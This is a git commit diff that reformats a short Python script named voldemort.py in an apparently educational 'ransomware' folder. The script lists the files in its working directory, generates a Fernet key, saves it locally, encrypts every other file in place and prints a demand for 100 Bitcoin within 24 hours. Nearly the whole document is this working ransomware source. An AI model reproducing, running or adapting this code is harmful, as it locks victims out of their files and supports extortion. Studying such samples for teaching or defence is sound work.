56728c6beec9f2da2af4888072ce6b402e77104a
mhuston <55804897+MalloryHuston@users.noreply.github.com>
2025-10-21 13:36:55 -0700

    Update voldemort.py

--- Cryptography/ransomware/voldemort.py
+++ Cryptography/ransomware/voldemort.py
@@ -1,32 +1,28 @@
 #!/usr/bin/env python3
-
 import os
 from cryptography.fernet import Fernet  # type: ignore
 
-# let's find some files
-
+# Let's find some files!
 files = []
 
 for file in os.listdir():
-	if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py":
-		continue
-	if os.path.isfile(file):
-		files.append(file)
+    if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py":
+        continue
+    if os.path.isfile(file):
+        files.append(file)
 
 print(files)
-
 
 key = Fernet.generate_key()
 
 with open("thekey.key", "wb") as thekey:
-	thekey.write(key)
+    thekey.write(key)
 
 for file in files:
-	with open(file, "rb") as thefile:
-		contents = thefile.read()
-	contents_encrypted = Fernet(key).encrypt(contents)
-	with open(file, "wb") as thefile:
-		thefile.write(contents_encrypted)
+    with open(file, "rb") as thefile:
+        contents = thefile.read()
+    contents_encrypted = Fernet(key).encrypt(contents)
+    with open(file, "wb") as thefile:
+        thefile.write(contents_encrypted)
 
-
-print("All of your files have been encrypted!! Send me 100 Bitcoin or I'll delete them in 24 hours.")
+print("Your files are encrypted! Send 100 BTC or they're gone in 24 hours.")
